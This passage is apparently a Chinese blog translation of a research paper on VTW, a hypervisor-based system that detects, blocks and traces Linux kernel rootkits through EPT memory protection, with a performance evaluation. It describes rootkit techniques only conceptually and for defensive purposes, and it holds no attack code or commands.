LKM、已加载的 LKM，抑或两者都是。</p><p>VTW 决定一个 LKM 是否为一个内核 rootkit。对于内核 rootkits，VTW 通过阻塞他们的破坏行为并恢复被破坏的数据来对抗他们。rootkit 检测方法如 “Rootkit 攻击检测” 所示，条件设置展示于 表4 中。该方法可以被用以预检测静态与动态的内核对象。</p><p><img src="https://s2.loli.net/2023/04/08/pX1lVcQrSfg5wiK.png" alt="image.png"></p><p><em>Rootkit 攻击检测</em> （Detection of Rootkit Attacks）。其被用以检测内核 rootkit 并保护内核不被摧毁。步骤 1 ~ 5 用于静态内核对象保护，步骤 6 ~ 8 用于隐藏检测，步骤 9 ~ 11 用于动态内核对象保护。</p><p><img src="https://s2.loli.net/2023/04/08/PvFmjXe2TyQLi4K.png" alt="image.png"></p><h2 id="5-1-Static-Kernel-Object-Protection"><a href="#5-1-Static-Kernel-Object-Protection" class="headerlink" title="5.1 Static Kernel Object Protection"></a>5.1 Static Kernel Object Protection</h2><p>静态内核对象（$\mu$ 与 $\xi$）在操作系统中保持不被改变。特定的内核控制流执行路径与一些重要的数据被存放于静态内核对象中。内核 rootkits 可以通过破坏静态内核对象的完整性来达成他们的恶意目的。</p><p>为了保护静态内核对象（如操作系统代码段、数据段、系统调用表等），VTW 通过分析文件 $”System.map”$ 或从内核代码段提取以获得他们的线性地址，并将其翻译为物理地址。</p><p>之后，VTW 设置标识这些物理地址的 EPT 条目（$\zeta$）的写权限为 “不可写”（表4 中的 ④ ~ ⑤）。在 “guest” 模式中，对静态内核对象的写操作（$WriteTo$）将触发 “EPT violation” 造成操作系统陷入到 “host” （“Rootkit 攻击检测” 中的 步骤 1）。接下来，VTW 注入一个 #GP 异常（$InjectGP$） 到 “guest” 中以预防 LKM 摧毁内核数据（步骤 2）。</p><p>需要注意的是最小的内存保护粒度为一张 “页”。然而并非所有的静态内核对象都占用完数个页，因此当一个 “EPT 损坏” 异常被抛出，VTW 首先确认异常地址是否属于被保护对象的地址范围。</p><p>若是，则当前操作会被阻塞，若否，则 VTW 将设置 “guest” 为单步执行模式（步骤4 中的 $SingleStep$ ）。接下来其将页设置为 “可写的” （步骤 5）。最后 VTW 将操作系统切换回 “guest” 模式以完成后续的写入。在这之后，操作系统重新陷入 “host”，VTW 通过函数 $OpenWrite$ 将页恢复到 “不可写” 。</p><h2 id="5-2-Dynamic-Kernel-Object-Protection"><a href="#5-2-Dynamic-Kernel-Object-Protection" class="headerlink" title="5.2 Dynamic Kernel Object Protection"></a>5.2 Dynamic Kernel Object Protection</h2><p>内核 rootkits 可以通过篡改动态内核数据来达成如劫持控制流的恶意目的。被篡改的内核数据包括控制数据与非控制数据，前者指的是指向内核控制流的指针。</p><p>这些指针通常被用于构造语义视角，例如存储于 $”proc”$ 文件系统中的函数指针。后者则指某些状态描述符中的一些条目，如 $”struct module”$ 中的条目 $”prev”$ 与 $”next”$。</p><p>实时更新的内核数据与被 rootkits 篡改的目标数据可能会存放在同一张页中，因此我们无法通过限制内存页的写权限来预防内核 rootkits 篡改内核数据。</p><p>此外，攻击时间的随机性使得实时检测篡改操作变得困难。面对这些问题，VTW 跟踪 LKMs 的执行，并在 LKM 追踪中检测动态内核数据。</p><h3 id="5-2-1-Hidden-Kernel-Detection"><a href="#5-2-1-Hidden-Kernel-Detection" class="headerlink" title="5.2.1 Hidden Kernel Detection"></a>5.2.1 Hidden Kernel Detection</h3><p>自我隐藏是内核 rootkit 的基本特性，隐藏行为可以被作为判断一个 LKM 是否为一个 rootkit 的标准。通常情况下，内核 rootkits 在初始化时实现自我隐藏。</p><p>因此，VTW 需要在其初始化完成之前检测其是否被隐藏。为了追踪模块初始化，我们在 $sys_init_module()$ 设置了一个指令断点并监控 LKM 的状态改变。当状态被切换到 $MODULE_STATE_LIVE$ 时，VTW 会检查模块是否被隐藏。内核 rootkits 通过从链表上移除他们的状态描述符来破坏与其他对象的逻辑连接以进行隐藏，LKMs 之间的逻辑连接可以被用来确认模块是否被隐藏。</p><p>$\mathscr{M}$c 为 LKM 正在被装载，$\mathscr{M}$p 为被$\mathscr{M}$c 中的条目 $prev$ 指向的模块，$\mathscr{M}$n 为被 $\mathscr{M}$c 中条目 $next$ 所指向的模块（表4 中的 ⑦~⑧）。若模块 $\mathscr{M}$c 与其相邻节点并不存在链表连接关系（“Rootkit 攻击检测” 中的步骤 6 ），或连接关系不完整（步骤 7 ~ 8），则我们判断 模块 $\mathscr{M}$c 被隐藏了。</p><h3 id="5-2-2-Dynamic-Kernel-Data-Detection"><a href="#5-2-2-Dynamic-Kernel-Data-Detection" class="headerlink" title="5.2.2 Dynamic Kernel Data Detection"></a>5.2.2 Dynamic Kernel Data Detection</h3><p>除了状态描述符外，内核 rootkits 还会篡改带有控制属性的内核数据以进行内核控制流重定向。在重定向前这类内核数据又指向内核代码段的指针组成，内核 rootkits 重写指针以重定向到他们的自定义代码。</p><p>被重定向的对象主要包括多种用于构建操作系统语义视角的操作函数。$”proc”$ 文件系统中的函数指针（例如 $lookup$）对内核 rootkits 而言为最脆弱的对象，因此有必要保护这些函数指针不被篡改。</p><p>为了隐藏网络连接（例如网络端口），内核 rootkits 还会攻击  $”&#x2F;proc&#x2F;net&#x2F;tcp”$、$”&#x2F;proc&#x2F;net&#x2F;tcp6”$ 、$”&#x2F;proc&#x2F;net&#x2F;udp”$ 、$”&#x2F;proc&#x2F;net&#x2F;udp6”$ 中的数据，因此这些文件描述符中的函数指针同样需要被保护。</p><p>除了上述内核对象，VTW 还要将如 $”root”$ 与 $”log”$ 这样关键文件的函数指针作为保护对象。所有的函数指针与他们的存储地址可以在 VTW 初始化中通过特定的数据结构（如 $f_dentry-&gt;d_inode-&gt;i_op-&gt;lookup$）从内存中提取。</p><p>所有被提取的数据形成一个集合 $k$ ，$k$ 中所有的动态内核数据指向固定的内核函数且不需要被更新。仅当我们发现一个新的内核 rootkit 修改一个不在 $k$ 中的某些内核数据时我们才扩展 $k$。此外，VTW 通过 EPT 将 $k$ 设置为读写保护，并禁止 “guest” 中的执行实体访问 $k$ 以保护他。</p><p>现在 $k$ 占用大概 64KB 的内存且包含 4000 份内核数据，其将根据新 rootkits 的突发情况而增长。在实战中，现有的内核 rootkits 通常修改不超过 500 份内核数据。我们将范围扩大以进行更好的保护。</p><p>$k$ 中的每个元素 $D$ 对应一个独特的内核对象（表 4 中的 ⑨）。元素 $D$i 作为二元数据对 （$a$i，$c$i）存在，$a$i 表示被保护的数据的地址，$c$i 则表示数据内容（⑩）。X 为内核代码范围$s \sim _\mathscr{e}$ （⑪）的范围。</p><p>在 LKM 的执行中，VTW 会检测地址 $a$i 上的内核数据 $c$i$’$ 是否指向内核代码段（⑫）。若存在 $c$i 并不指向内核代码段，则其可以确认内核控制流被重定向了（“Rootkit 攻击检测” 中的 10）。在检测到被篡改的内核数据 $c$i$’$ 后，VTW 读取在 $D$i 中保存的  $c$i 并将其写入到 $D$i.$a$i （步骤 11）。之后被篡改的内核数据恢复到了其初始值。</p><p>与内核 rootkits 不同，合法的 LKMs 不会修改状态描述符以进行自我隐藏，也不会修改带有系统函数指向特性的扩展数据以进行控制流重定向。</p><p>此外，我们保护动态内核数据的方法为在 LKM 执行的特定阶段检查被保护数据的完整性（例如调度与跳转），而非限制所有执行实体对属于内核数据的数据结构的访问。结果便是 VTW 可以从所有的 LKMs 中识别出 rootkits 且不会影响到其他 LKMs 的执行。</p><h2 id="5-3-Bypassing-Resistance-of-VTW-Effects"><a href="#5-3-Bypassing-Resistance-of-VTW-Effects" class="headerlink" title="5.3 Bypassing Resistance of VTW Effects"></a>5.3 Bypassing Resistance of VTW Effects</h2><p>以 VTW 的加载时间作为分界点，LKMs 可以被分为已被装载的 LKMs 与未被装载的 LKMs。当 VTW 被成功加载后，其可以及时监控并控制所有未被装载的 LKMs 的装载与执行，使其无法绕过检测。</p><p>对于在 VTW 载入前被装载的 LKMs，VTW 无法在 “host” 模式下常规地检测与跟踪，因为这会提高绕过 VTW 的风险。</p><p>有两个解决该问题的方法。其一是将 VTW 设为开机时启动，这样绝大部分的 LKMs 都会被包含在监控范围内，然而这种办法对于那些同样在开机时启动的 LKMs 而言仍是无效的。</p><p>第二种方法便是使用内核完整性检查的办法来定位有害的 LKM。被重定向的控制流属于 rootkits，可以通过将 LKM 列表中的控制流地址（$mal_addr$）与每个代码段（$module-&gt;core,module-&gt;core+module-&gt;core_size$）进行配对以确定 rootkit 是否已被隐藏。若是，$mal_addr$ 将被作为定位隐藏 LKM 的起始点。过程如 图.4 所示。</p><p><img src="https://s2.loli.net/2023/04/08/ZY8sMaE7ehj2BSH.png" alt="图.4 定位隐藏的“struct module”"></p><p>LKM 的代码段与数据段在虚拟空间中是连续的，他们的最后一级页表项是相邻的。因此，通过使用他们之间不同的可执行性（最后一级页表项的 NX 位），代码段的末尾地址（$code_end$）与数据段的起始地址（$data_start$）可以被识别。</p><p>在这之后，我们使用数据段的读写权限（最后一级页表项的 RW 位）来获得可写数据段的起始地址（$writable_data_start$）。LKM 的状态描述符（$struct\ module$）便存放在可写数据段中。</p><p>根据 LKM 代码段按页对齐的特性，代码段的起始地址为 $data_start$-$N * page_size$ ，其值为 $module-&gt;module_core$。从 $writable_data_start$ 开始，我们假设每个字节的起始地址便是 LKM 代码的第一个地址。</p><p>接下来我们基于 $module-&gt;module_core$ 与 $module-&gt;core_text_size$ 间的相对位移计算 $module-&gt;core_text_size$ 的地址，对  $module-&gt;module_core$ 与 $module-&gt;core_text_size$  的正确表示为最后 12 位都为0、两者总和位 $data_start$。</p><p>之后我们以一个单字节作为步长检查所有在 $writable_data_start$ 之后的内存，直到我们获得合适的 $module-&gt;module_core$ 与 $module-&gt;core_text_size$ 。最后，module 结构体的第一个地址使用与 $struct\ module$ 相关的 $module-&gt;module_core$ 的偏移进行计算。相比于第一种方法，这种方法有着更大的范围，但实现过程相对更加复杂。 VTW 同时使用两种方法来达成最佳的防护效果。</p><h1 id="6-Rootkit-Tracing-Process"><a href="#6-Rootkit-Tracing-Process" class="headerlink" title="6 Rootkit Tracing Process"></a>6 Rootkit Tracing Process</h1><p>内核 rootkit 可能在 LKM 正在加载时或已被加载后发动攻击，单次攻击的参与者可能是单个或多个模块。</p><p>我们将修改内核数据的直接发起者作为行为载体，攻击的最初发起者称为动作载体，其代码替换了原始内核函数的 LKM 称为函数载体。</p><p>为了追踪所有参与了一次攻击的内核 rootkits，VTW 带来了两种新的方法：“跟踪此前与此后的 rootkit 攻击” 与 “攻击回放程序”，这些方法所需的条件如 表5 所示。</p><p><img src="https://s2.loli.net/2023/04/09/mnQvHSb8W5ANkg4.png" alt="image.png"></p><p>其他参与了攻击的 LKMs 被称为过程载体。这些载体之间可能存在重叠，例如正在被装载的 LKM 可以重定向内核控制流到导出函数，在这次攻击设想中，LKM 同时属于动作载体与行为载体，被装载的 LKM 属于函数载体，不存在过程载体。</p><p>所有被监控的 LKMs 形成了元组 $T$ ，所有参与了同一事件的 LKMs 形成了元组 $\mathscr{R}$ （表5 中的①）。当一个 LKM 正在运行，我们开启其执行权限，同时除了在其他 CPU 核心上正在运行的 LKMs 以外，其他所有 LKMs 的执行权限都被关闭（②）。所有运行在不同核心上的 LKMs 形成一个元组 $\mathscr{F}$ （表5 中的 ③）。要被调度以执行的 LKM （$\mathscr{F}$j）与第 k 个 CPU 核心关联（④），LKM 所属的内存被记录为 $\alpha$ （⑤）。</p><h2 id="6-1-Trace-LKM-Execution-Events"><a href="#6-1-Trace-LKM-Execution-Events" class="headerlink" title="6.1 Trace LKM Execution Events"></a>6.1 Trace LKM Execution Events</h2><p>有三种执行 rootkit 的方式，第一种为 LKM 在模块加载时调用其初始化函数，在这种情况下攻击可能在加载完成前被启动。</p><p>第二种为 LKM 在完成载入之后其导出函数被其他模块调用，被加载的 LKM 可以被调用以修改内核数据，或是被用作函数载体来替换内核的原始函数。</p><p>第三种为 LKM 被通过创建一个内核线程而执行，攻击可以在线程生命周期的任意时间被触发。</p><p>一个完整的攻击可能包括一种或多种上述的执行。为了监控 LKM 的执行，VTW 设置了目标已被装载 LKMs 为不可执行。</p><p>然而由于大量的内存设置操作，这种办法是低效的。以一个有着 4MB 代码段的 LKM 为例，VTW 必须要操作 EPT 页表多余 2000 次以完成一次执行权限的开启与关闭。为了减少页表设置操作的数量，VTW 建立了一种机制来管理 LKM 的执行权限，如 图.5 所示。</p><p><img src="https://s2.loli.net/2023/04/09/WcROlmhj4Yix2Aw.png" alt="图.5 页表重定向机制"></p><p>VTW 首先通过 $”struct \ module”$ 获得 LKM 代码段的地址范围，接下来其计算最后一级可以查找整个 LKM 代码地址范围的页表（$last_page_table$）。在其上层页表保存了 $last_page_table$ 地址的页表入口 （$orig_item$ ）将会被记录。</p><p>在这之后，VTW 创建一个新的页表 （$new_last_page_table$） 并通过 EPT 将其设为 “不可写”。其会使用 $new_last_page_table$ 的地址覆写 $orig_item$。接下来 VTW 将 $last_page_table$ 的所有内容拷贝到 $new_last_page_table$ 中。与此同时其会为每个目标 LKM 创建一份内存页并通过 EPT 将其设为 “不可执行”，该内存页被称之为 $fake_code$，其地址则为 $fake_mem$。</p><p>最后， LKM 的代码段 在 $new_last_page_table$ 中对应的的所有条目都被填充为 $fake_mem$，若我们尝试打开 LKM 的执行，则 $orig_item$ 将被用 $fake_mem$ 重写。由此，控制流将会被重定向到 $fake_code$ 上。 EPT 异常地址（$fake_item$）将说明哪一个 LKM 将要被执行。</p><p>在 LKM 执行中，第一个被执行的 LKM 称之为第一个模块，发出了模块间调用请求的 LKM 被称为活动模块，被调用的 LKM 被称为被调用模块。</p><p>在第一个 LKM 被执行前，VTW 读取调用函数储存在内核栈上的返回地址并在此处设置一个执行断点，接下来 VTW 启用 LKM 的执行权限。当控制流在 LKMs 之间切换时，我们追踪控制流流过的所有 LKMs。追踪方案如下所示。</p><h2 id="6-2-Forward-Versus-Backward-of-Rootkit-Attack"><a href="#6-2-Forward-Versus-Backward-of-Rootkit-Attack" class="headerlink" title="6.2 Forward Versus Backward of Rootkit Attack"></a>6.2 Forward Versus Backward of Rootkit Attack</h2><p>rootkits 攻击在如下所示的 11 个步骤的前向与后向阶段中被实施。该方法用以监控 LKM 控制流的跳转与返回。步骤 1 ~ 6 监控跳转，步骤 7 ~ 11监控返回过程。</p><p><img src="https://s2.loli.net/2023/04/09/XmxawZS56dG38kT.png" alt="image.png"></p><p>由于对 LKM 的权限设置，在该过程中任何在 LKMs（$ConFlowTrans$）间的控制流的跳转都将触发操作系统陷入到 “host” （步骤 1）。VTW 通过所流过的控制流记录每一个 LKM （步骤 2），并检查每个跳转的内核数据的合法性。若数据合法（步骤 3），VTW 将开启被调用模块的执行权限（$TurnOffExe$）并关闭活跃 LKM 的执行权限 （$TurnOnExe$，步骤 4）。否则，VTW 通过函数 $HandleException$ 处理非法的 LKM（步骤 5 ~ 6），并处理包括数据恢复（$RecoverData$）与 #GP 注入（$InjectGP$）的操作。</p><p>当 LKM 的控制流返回时（$ControlFlowRet$），VTW 跟踪返回动作（步骤 7 ~ 11），当返回到设置在第一个 LKM 的返回地址的断点时，意味着当前的执行完成了。</p><p>当活动的 LKM 提交了一个在 LKMs 间的调用请求或是控制流返回到之前的 LKM，VTW 将检测是否当前的内核数据已经被活动的 LKM 篡改了。对于动态内核数据，VTW 使用 “Rootkit 攻击检测” 方法进行检测。</p><p>对于有着写保护的静态内核数据，任何的篡改都将导致操作系统陷入到 “host”，之后 VTW 将操作系统设置到单步调试并启用对内核数据的写权限。由此，在 LKM 完成对静态内核数据的篡改后，其会再次陷入到 “host”。最后 VTW 读取被篡改的数据并使用备份数据中的初始值进行恢复。</p><p>通过上述操作，VTW 可以获得篡改的数据，将篡改的数据与所有 LKMs 的代码段范围进行对比，我们可以得知重定向控制流所属的 LKM。</p><p>若检测到内核数据被篡改了，当前运行的内核模块将被认为是攻击的行为载体，第一个模块将成为动作载体，重定向控制流所属的模块则成为函数载体。</p><p>其他的 LKMs 将成为过程载体。为了预防更多的伤害，VTW 向当前控制流注入一个通用保护异常。最后，被篡改的内核数据将被复原，当前的有害操作将被终止。</p><h2 id="6-3-Task-Switching-in-Multicore-Execution"><a href="#6-3-Task-Switching-in-Multicore-Execution" class="headerlink" title="6.3 Task Switching in Multicore Execution"></a>6.3 Task Switching in Multicore Execution</h2><p>当 LKM 执行时发生了任务切换，LKM 的 CPU 资源将被收回。若 LKM 不再被调度，其将永远不会产生模块间调用请求，我们在返回地址设置的执行断点将永远不会被执行。由于缺乏触发条件，VTW 将在最后一次检测后忽略掉 LKM 在内核上的影响。</p><p>不同的 LKMs 可能被在多个核心上并行执行，这可能影响对行为载体的识别，例如两个 LKMs 可能同时在不同的 CPU 核心中运行。若动态内核对象被检测到在其运行时被篡改，我们无法算出这两个 LKMs 中的哪一个进行了有害操作。</p><p>为了确保精确的可追踪性，VTW 引入一个动作回放方法，在 “攻击回放程序”（Attack Playback Procedure）中展示。当一个 LKM 被调度以执行且在其他核心上有一个或更多 LKMs 正在被执行，则该方法会被启动。</p><h2 id="6-4-Attack-Playback-Procedure"><a href="#6-4-Attack-Playback-Procedure" class="headerlink" title="6.4 Attack Playback Procedure"></a>6.4 Attack Playback Procedure</h2><p>当多个 LKMs 同时跑在多个核心上时，该方法用以辨别哪一个 LKM 为内核 rootkit。攻击回放程序如下所示，步骤 1 ~ 5 为所需内容，步骤 6 ~ 9 进行回放。当 LKM $\mathscr{L}j$ 被载入在一个核心上运行时（$LoadOnCore$），该执行必须触发操作系统陷入到 host 模式（“攻击回放程序” 中的 步骤 1）。在这之后， $\mathscr{L}j$ 将被记录到元组 $\mathscr{F}$ 中（步骤 2）。</p><p>VTW 首先通过函数 $CheckKernel$ 检查当前的内核数据完整性是否被破坏，若未被破坏（步骤 3），其会拷贝当前的 CPU 上下文信息、内核栈、LKM 代码段（所有这些称作回放上下文）。</p><p><img src="https://s2.loli.net/2023/04/09/4qFEaxVPRTUcJCb.png" alt="image.png"></p><p>若有多于一个 LKM 运行在不同的 CPU 核心上，所有运行中的 LKMs 都已被备份，由此我们只需要备份要被执行的 LKM（步骤 4 ）。若仅有一个运行中的 LKM，正在被执行的 LKM 与将要被执行的 LKM 都需要要被备份（步骤 5）。在完成备份后，VTW 将操作系统再次切换回 “guest” 模式以继续运行。</p><p>为了算出哪一个 LKM 为内核 rootkit，所有的动作都会被通过 $ForEach$ 与 $ExeBack$ 函数为所有在其他核心上运行的 LKMs 逐一进行回放。回放步骤如 图.6 所示，回放过程为如下所示的五个步骤：</p><p>1） 使用之前备份的内容重写当前内核栈与 LKM 的数据。</p><p>2） 使用备份的 CPU 上下文填充 VMCS 的 “guest filed” 并恢复被破坏的内核数据。</p><p>3） 将操作系统切换到 “guest” 模式以开始 LKM 执行。</p><p>4） 在内核数据被摧毁的指令位置停止执行。</p><p>5）检测是否一个被破坏的数据将触发二次破坏。当前的 LKM 为行为载体。若该内核数据保持完整，则切换到步骤 （1） 恢复回放。</p><p><img src="https://s2.loli.net/2023/04/09/iagyB7kZt3jJnWT.png" alt="图.6 跟踪一个 Linux 服务器上两个执行核心间的任务切换"></p><p>通过该方法，每个 LKM 都将会从内核数据未被摧毁的位置开始执行，并停止在内核数据被摧毁的位置。若被回放的 LKM 破坏了内核数据的完整性，其将被识别为 rootkit（步骤 9）。</p><p>在追踪完成之后，VTW 将为剩余的 LKMs 恢复执行，并让他们从内核数据完整性被破坏的位置继续执行。</p><p>在动作回放过程中，被恢复的内核数据包括被篡改的内核数据与回放上下文，对前者的恢复将维持内核的完整性，后者则仅与被回放的 LKM 相关。由此，被恢复的内核数据并不会影响其他 LKMs 的执行。</p><p>我们分析了 23 个内核 rootkits 并发现除了回放上下文以外，他们不会修改其他内核数据。在对 72 个在 Linux 中被频繁使用的普通 LKMs （例如 $nf_nat,ib_cm,snd_seg$ 等）的监控过程当中，我们发现普通的 LKMs 将不会修改被保护的内核数据，也不会修改在回放上下文以外的任何东西。</p><p>由此，在进行动作回放时我们并不需要恢复除了被篡改的内核数据与回放上下文以外的内核数据，这并不会影响其他 LKMs 的正确性。</p><h1 id="7-Experiments-And-Performance-Analysis"><a href="#7-Experiments-And-Performance-Analysis" class="headerlink" title="7 Experiments And Performance Analysis"></a>7 Experiments And Performance Analysis</h1><p>我们使用几个内核 rootkit 与基准测试来测试 VTw 的防护效果与运行效率。</p><h2 id="7-1-Experimental-Environment"><a href="#7-1-Experimental-Environment" class="headerlink" title="7.1 Experimental Environment"></a>7.1 Experimental Environment</h2><p>实验中的物理 host 为一个有一颗 Intel i3-9100 @ 3.6 GHZ 4核心处理器、8G内存、256G硬盘的 HP 桌面电脑。不同 rootkit 的安装环境是非常不同的，为了安装 rootkit $f00lkit$，我们使用 Ubuntu 12.04 与内核 3.2.16 作为被测试操作系统。</p><h2 id="7-2-Rootkit-Detection-Defence-and-Traceability"><a href="#7-2-Rootkit-Detection-Defence-and-Traceability" class="headerlink" title="7.2 Rootkit Detection, Defence, and Traceability"></a>7.2 Rootkit Detection, Defence, and Traceability</h2><p>$f00lkit$ 通过修改系统调用表来隐藏目标对象，其将控制流重定向到其自己的代码段上。VTW 在 $f00lkit$ 上的检测效果如 图.7 所示。</p><p><img src="https://s2.loli.net/2023/04/09/4G8tqF7iSLXAjOv.png" alt="图.7 对一个典型被检测的 rootkit 攻击（f00lkit）的过程的虚拟化"></p><p>上、中、下三个窗口分别为在 VTW 载入之前对操作系统的入侵表现、在 VTW 载入后对操作系统的入侵表现、VTW 的防护结果。在上面的窗口中，我们发现 $f00lkit$ 可以隐藏以 $”f00l_“$ 开头的文件，如第二行所示。</p><p>中间的窗口显示了在 VTW 载入后 $f00lkit$ 不再对以 $”f00l_“$ 开头的文件有着隐藏的效果，当 $f00lkit$ 尝试修改系统调用表时，VTW 检测到了其意图并生成一个 “EPT violation”，之后 VTW 将一个 #GP 提交到 “guest” 进行预防。</p><p>为了测试 VTW 的可追踪性，我们重写了 rootkits $f00lkit$ 与 $xingyiquan$ ，并引入了两个辅助的 LKMs $jmp_lkm$ 与 $action_lkm$ ，在我们设置的攻击场景中，$f00lkit$ 并不会摧毁内核数据，其有一个用于替换系统函数以隐藏以 $”f00l_“$ 开头的文件的导出函数 $func_1$。</p><p>在辅助 LKM $action_lkm$ 中还有一个导出函数 $func_2$ 。当 $func_2$ 被执行时，其会篡改内核数据并将系统控制流重定向到  $func_1$ 。在辅助 LKM $jmp_lkm$ 中的导出函数为  $func_3$ ，在  $func_2$ 执行过程中  $func_3$ 会被调用。</p><p>上述三个导出函数直到被其他 LKMs 调用时才会被执行。当 $xingyiquan$ 执行时， $func_3$ 被 $xingyiquan$ 调用，最后内核函数被通过  $func_2$  重定向至 $f00lkit$。</p><p>LKM $action_lkm$ 直接篡改系统调用表，其为一个行为载体。原有的系统调用函数被 $f00lkit$ 中的函数所替，由此，VTW认定 $f00lkit$ 为一个函数载体。该次攻击的第一个发起者为 $xingyiquan$，其通过 $lkm_jmp$ 使得控制流跳转到其他模块，由此 $xingyiquan$ 被确定为动作载体，$jmp_lkm$ 被确定为过程载体。</p><p>VTW 检测、防御、追踪包括 $adore$-$ng、kbeast、wnps、brootus、diamorphine、z$-$rootkit、suterusu$ 等在内的内核 rootkits。VTW 通过 EPT 页表为如系统调用表的内核对象设置写保护，由此，任何写操作都将导致操作系统从 “guest” 模式陷入到 “host” 模式。</p><p>之后 VTW 使用 #GP 异常来防止非法操作。内核 rootkits 的整个执行过程都被 VTW 所监控。通过操控 LKMs 的执行权限，VTW 可以夺取每个 LKM 的执行。由此，LKM 的调用、跳转、返回都被同步记录。</p><h2 id="7-3-Performance-Evaluation"><a href="#7-3-Performance-Evaluation" class="headerlink" title="7.3 Performance Evaluation"></a>7.3 Performance Evaluation</h2><p>在本节中， VTW 在 CPU 上的执行开销将被使用 $nbench$ 测量，对系统延迟与带宽的影响将被 Lmbench 测量，对 I&#x2F;O 的影响将被 IOMeter 测量。所有的结果都在原生操作系统测试中进行了标准化。</p><p>$Nbench\ Test$。测试结果如 图.8 所示。VTW 引入了小于 2% 的 CPU 开销。VTW 本质上是一个轻量级的 hypervisor 且不提供如其他虚拟化平台（例如 Xen）那样复杂的虚拟化功能。由此，其带给 CPU 的性能开始非常小。</p><p><img src="https://s2.loli.net/2023/04/10/B4QEyK5VCW9JviO.png" alt="图.8 VTW 方案的执行开销。x-axis 显示了运行速度损失系数，y-axie 为执行的基准测试程序"></p><p>$Lmbench\ Test$。Lmbench 被用以测量系统延迟与贷款。测试结果如 图.9a、9b、9c 所示。VTW 增加了平均 8.8% 的内存与网络延迟与平均 5.9% 的文件操作延迟。通信带宽减少了 2.2%。</p><p><img src="https://s2.loli.net/2023/04/10/crCIiGy58atvN29.png" alt="图.9 内存/网络访问延迟，文件操作与 IO 带宽的减少被绘制为系统对基准或网络、内存、文件访问操作的百分比"></p><p>在 Lmbench 测试中，我们发现 OS 在 “host” 与 “guest” 间的切换频率显著地增长了，大部分的切换由指令 $cpuid$ 引起。由于缓存操作速度非常快，其对于任何的延迟都是极度敏感的。由此，在缓存上的模式切换的影响是尤其明显的，导致了将近 20% 的延迟开销。</p><p>$IOMeter Test$。IOMeter 是由 Intel 开发的一个用以测试最大磁盘 I&#x2F;O 性能与最大数据吞吐量的一个测试工具测试结果如 图.10a、10b 所示，该图展示了 VTW 造成了平均 8.9% 的 I&#x2F;O 带宽减少，与平均 3.9% 的运行时间增长。</p><p><img src="https://s2.loli.net/2023/04/10/NRl3YwFcbPjtvEC.png" alt="I/O表现开销绘制为 I/O 带宽损失系数与 I/O 时间增长 "></p><p>VTW 在 I&#x2F;O 上的影响主要由 I&#x2F;O 操作的运行时间导致，这减少了 I&#x2F;O 吞吐量且增加了 I&#x2F;O 响应时间。由 VTW 引入的开销包括存储与计算开销。</p><p>存储开销主要指内存开销，包括内存空间开销与寻址时间开销。 VTW 占用不多于 200KB 的内存空间来存储其核心代码与数据，以及 64KB 以存储被保护的内核数据。</p><p>计算开销来自由 VTW 带来的事件注入、内核保护与异常处理，这些操作将造成操作系统从 guest 模式陷入 “host” 模式。</p><p>在 host 模式中，VTW 将接管控制流并进行异常处理。在异常处理完成之后，VTW 将操作系统切换回 “guest” 模式，并将控制流返还给操作系统进行后续执行。</p><p>在整个过程中 “guest” 模式的执行始终是被阻塞的，因此如执行速度、延迟、网络延迟、I&#x2F;O 吞吐这样的表现指示器将会受到影响。此外，模式切换造成对 TLB 与缓存的刷新，这将增加对操作系统的性能影响。</p><p>当 VTW 正在运行，导致操作系统进行模式切换的因素包括指令陷入与事件陷入，前者由对特定指令的执行触发，后者由特定事件触发。在 guest 模式中，对指令 CPUID、GETTSEC、INVD、XSETBV 与除了 VMFUNC 以外的所有 VMX 指令都将导致操作系统无条件地陷入到 “host”。</p><p>触发操作系统模式切换的事件包括模块加载、模块卸载、在模块加载时的状态切换、模块间的跳转与控制流返回、模块调度执行、“host” 私有页表的更新、篡改静态内核数据、单步调试模式、动作回放。</p><p>$Impact on the Execution Speed of LKM$。为了测量 VTW 在 LKM 执行速度上的影响，我们引入了两个测试模块 $LKM_1$ 与 $LKM_2$ ，他们分别属于 CPU 密集型与 I&#x2F;O 密集型的模块，前者用以计算 $\pi$ 的值，后者用以读写文件。</p><p>测试结果如 图.11 所示。横坐标为实线指示了 $\pi$ 小数点后的位数，与文件操作数量相关的为点线。纵坐标指示了速度损失速率。</p><p><img src="https://s2.loli.net/2023/04/10/LwJ8WEfkNdTosPb.png" alt="图.11 LKM 速度损失系数与 Π 的小数位数绘制为实线，I/O 操作的数量绘制为点线"></p><p>与此相反，当模块运行较长一段时间时，由 VTW 造成的性能损失比例更小。对于普通 LKMs 而言，VTW 仅在他们被加载以及状态被更新时干涉他们的执行。由 VTW 造成的 “guest” 的阻塞时间是比较固定的。当 LKM 的执行时间较短时，VTW 会阻塞 “guest” 模式更多比例的时间，由此性能损失系数会变得更大。</p><p>陷阱的数量与在模块间的控制流跳转的数量为影响 LKM 执行速度的关键因素。我们以一个运行时间大约 7.6s 的 $LKM_3$ 作为测试对象，并测量了陷阱数量在其执行速度上的影响。</p><p>我们重写了 $LKM_1$ 与 $LKM_2$ 使得控制流在其间跳转， 他们可以被用以测量跳转次数对 LKM 执行速度的影响。实验结果如 图.12 所示。</p><p><img src="https://s2.loli.net/2023/04/11/p4HBzul5Tcj9iRm.png" alt="图.12 系统陷阱与控制流跳转在 LKM 执行速度上的影响"></p><p>点线显示了当陷阱数量较少时 VTW 在 LKM 的执行速度上的影响是较小的。当陷阱数量超过 1000000 时，LKM 的执行将会减速到 80%。实线显示了当跳转数量超过 100 时，VTW 减速到了 8%。当跳转数量超过 1000 时， LKM 的执行速度将会急剧减小。</p><p>控制流跳转对 LKM 执行的影响比陷阱更大。一个完整的跳转与返回涉及到两个模式切换与四个代码执行权限，因此 VTW 在处理模块间跳转时会遇到更多的开销，</p><h2 id="7-4-Comparison-With-Other-Defence-Schemes"><a href="#7-4-Comparison-With-Other-Defence-Schemes" class="headerlink" title="7.4 Comparison With Other Defence Schemes"></a>7.4 Comparison With Other Defence Schemes</h2><p>在 表.6 中，我们将 VTW 的表现与七个已知 rootkit 防御方案对比。大部分其他的 rootkit 防护方案应用了虚拟机的内省技术，这与 VTW 主要基于事件追踪的方案是非常不同的。</p><p><img src="https://s2.loli.net/2023/04/11/1wYp3xarzkyiXSF.png" alt="表.6 VTW 方案与其他防护方案对比"></p><p>我们从四个表现领域对他们进行定性比较：$检测、防护、可追踪性、可移植性$。VTW 在这四个领域有着如前文所述的显著的优点。在未来的工作中需要更多的基准测试实验以揭示一些定量的结果。</p><p>我们的 VTW 仅被设计以支持 Intel 处理器及仅保护基于 Linux 的 x86 服务器。当前的 VTW 版本并不支持运行 Windows 或其他操作系统平台的服务器。然而，Virtuoso 